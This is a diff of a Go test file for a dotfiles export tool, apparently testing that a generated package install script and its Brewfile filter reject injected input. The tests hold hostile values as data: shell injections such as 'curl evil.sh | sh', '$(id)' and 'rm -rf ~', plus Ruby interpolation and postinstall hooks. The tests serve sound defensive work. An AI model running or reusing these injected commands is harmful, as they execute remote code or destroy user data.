@@ -36,9 +36,10 @@ func TestPlanExportEncryptDecision(t *testing.T) {
 	}
 	exists := func(p string) bool { return p != "/h/none" }
 	// gitconfig hides a real secret; everything else is clean.
-	secret := func(p string, isDir bool) bool { return p == "/h/.gitconfig" }
+	secret := func(p string) bool { return p == "/h/.gitconfig" }
+	home := func(p string) bool { return false }
 
-	plan := PlanExport(entries, "/h", exists, secret)
+	plan := PlanExport(entries, "/h", Probes{Exists: exists, SecretInFile: secret, HasHomePath: home})
 	got := map[string]PlanItem{}
 	for _, p := range plan {
 		got[p.ID] = p
@@ -191,20 +192,20 @@ func TestBuildPackageInstallScript(t *testing.T) {
 	}
 	for _, want := range []string{
 		"#!/bin/bash", "set -uo pipefail",
-		"command -v brew", "brew bundle --file=/dev/stdin", "BREWFILE",
-		"command -v fnm", "fnm install v20.0.0 || true",
-		"command -v bun", "bun add -g argent || true",
-		"command -v cargo", "cargo install ripgrep || true",
-		"command -v pipx", "pipx install poetry || true",
-		"command -v rustup", "rustup toolchain install stable || true",
-		"command -v cursor", "cursor --install-extension anthropic.claude-code || true",
-		"command -v uv", "uv tool install ruff || true",
-		"command -v composer", "composer global require laravel/installer || true",
-		"command -v dart", "dart pub global activate melos || true",
-		"command -v dotnet", "dotnet tool install --global dotnetsay || true",
-		"command -v apt-get", "sudo apt-get install -y ripgrep || true",
-		"command -v snap", "sudo snap install code || true",
-		"command -v flatpak", "flatpak install -y flathub org.gimp.GIMP || true",
+		"command -v brew", "brew bundle --file=-", "BREWFILE",
+		"command -v fnm", "fnm install 'v20.0.0' || true",
+		"command -v bun", "bun add -g 'argent' || true",
+		"command -v cargo", "cargo install 'ripgrep' || true",
+		"command -v pipx", "pipx install 'poetry' || true",
+		"command -v rustup", "rustup toolchain install 'stable' || true",
+		"command -v cursor", "cursor --install-extension 'anthropic.claude-code' || true",
+		"command -v uv", "uv tool install 'ruff' || true",
+		"command -v composer", "composer global require 'laravel/installer' || true",
+		"command -v dart", "dart pub global activate 'melos' || true",
+		"command -v dotnet", "dotnet tool install --global 'dotnetsay' || true",
+		"command -v apt-get", "sudo apt-get install -y 'ripgrep' || true",
+		"command -v snap", "sudo snap install 'code' || true",
+		"command -v flatpak", "flatpak install -y flathub 'org.gimp.GIMP' || true",
 		"# deno global bins", "#   deployctl",
 		"exit 0",
 	} {
@@ -225,4 +226,109 @@ func TestBuildPackageInstallScript(t *testing.T) {
 // resolves in tests regardless of GOOS.
 func platPath(p string) map[string]string {
 	return map[string]string{runtime.GOOS: p}
+}
+
+func TestPlanTemplatesOnlyWhenHomeIsNamed(t *testing.T) {
+	entries := []registry.Entry{
+		{ID: "shell.zshrc", Category: "shell", Kind: registry.File, Paths: platPath("/h/.zshrc")},
+		{ID: "terminal.wezterm", Category: "terminal", Kind: registry.File, Paths: platPath("/h/.wezterm.lua")},
+	}
+	plan := PlanExport(entries, "/h", Probes{
+		Exists:       func(string) bool { return true },
+		SecretInFile: func(string) bool { return false },
+		HasHomePath:  func(p string) bool { return p == "/h/.zshrc" },
+	})
+	if !plan[0].Template || plan[1].Template {
+		t.Errorf("template decision: %+v", plan)
+	}
+}
+
+func TestPlanFilesEncryptsPerFile(t *testing.T) {
+	item := PlanItem{ID: "editor.nvim", Kind: "dir", Src: "/h/.config/nvim"}
+	files := PlanFiles(item, []string{"/h/.config/nvim/init.lua", "/h/.config/nvim/secrets.lua"}, func(p string) bool { return strings.HasSuffix(p, "secrets.lua") })
+	if files[0].Encrypt || !files[1].Encrypt {
+		t.Errorf("per-file encryption: %+v", files)
+	}
+	high := PlanFiles(PlanItem{Kind: "dir", Encrypt: true}, []string{"/a"}, func(string) bool { return false })
+	if !high[0].Encrypt {
+		t.Error("a high-sensitivity dir encrypts every file")
+	}
+}
+
+// Names come from a backup's inventory, which a readable GitHub copy lets
+// anyone with write access edit. Nothing a shell or Ruby reads as code gets
+// into the install script.
+func TestInstallScriptRefusesInjectedNames(t *testing.T) {
+	script, _ := BuildPackageInstallScript(Manifest{
+		NpmGlobals:   []string{"typescript", "@scope/pkg@1.2.3", "x; curl evil.sh | sh", "$(id)", "`id`", "a'b"},
+		CargoCrates:  []string{"ripgrep", "rg && rm -rf ~"},
+		NodeVersions: []string{"v20.11.0", "lts/iron", "v1\nrm -rf ~"},
+		DenoBins:     []string{"deployctl", "x\nrm -rf ~"},
+		Brewfile: strings.Join([]string{
+			`tap "homebrew/cask-fonts"`,
+			`brew "git"`,
+			`brew "postgresql@16", restart_service: :changed`,
+			`brew "nginx-full", args: ["with-rtmp-module"]`,
+			`mas "Final Cut Pro", id: 424389933`,
+			`vscode "ms-python.python"`,
+			`brew "x#{system('id')}"`,
+			`system("id")`,
+			`BREWFILE`,
+			`rm -rf ~`,
+		}, "\n"),
+	})
+	for _, bad := range []string{"curl evil", "$(id)", "`id`", "a'b", "rm -rf", "system(", "#{"} {
+		if strings.Contains(script, bad) {
+			t.Errorf("script contains %q:\n%s", bad, script)
+		}
+	}
+	for _, good := range []string{"'typescript'", "'@scope/pkg@1.2.3'", "'ripgrep'", "'lts/iron'", "#   deployctl",
+		`brew "postgresql@16", restart_service: :changed`, `brew "nginx-full", args: ["with-rtmp-module"]`,
+		`mas "Final Cut Pro", id: 424389933`, `vscode "ms-python.python"`, `tap "homebrew/cask-fonts"`} {
+		if !strings.Contains(script, good) {
+			t.Errorf("script lost %q:\n%s", good, script)
+		}
+	}
+	// The heredoc ends exactly once: a line "BREWFILE" in the data cannot end it early.
+	if strings.Count(script, "\nBREWFILE") != 1 {
+		t.Errorf("heredoc terminator appears more than once:\n%s", script)
+	}
+}
+
+// What brew bundle dump writes passes; what runs a command, or reaches an
+// interpolation, does not.
+func TestSafeBrewLine(t *testing.T) {
+	for _, l := range []string{
+		`tap "homebrew/cask-fonts"`,
+		`tap "me/tools", "https://github.com/me/homebrew-tools"`,
+		`brew "postgresql@16", restart_service: :changed`,
+		`brew "nginx-full", args: ["with-rtmp-module"], link: false`,
+		`cask "firefox", args: { appdir: "~/Applications" }`,
+		`cask "iterm2", greedy: true`,
+		`mas "Final Cut Pro", id: 424389933`,
+		`mas "C# Notes", id: 1234`,
+		`brew 'single-quoted'`,
+		`vscode "ms-python.python"`,
+		`brew "git" # a comment`,
+	} {
+		if !SafeBrewLine(l) {
+			t.Errorf("rejected a line brew bundle writes: %s", l)
+		}
+	}
+	for _, l := range []string{
+		`brew "x", postinstall: "curl evil | sh"`,
+		`cask "x", postinstall: "${HOMEBREW_PREFIX}/bin/x --setup"`,
+		`brew "x#{system('id')}"`,
+		`brew "x#@evil"`,
+		`brew "x#$evil"`,
+		`tap "evil/tap", "file:///tmp/evil"`,
+		`tap "evil/tap", "ssh://host/repo"`,
+		`system("id")`,
+		`brew "a", args: [system("id")]`,
+		`BREWFILE`,
+	} {
+		if SafeBrewLine(l) {
+			t.Errorf("accepted: %s", l)
+		}
+	}
 }
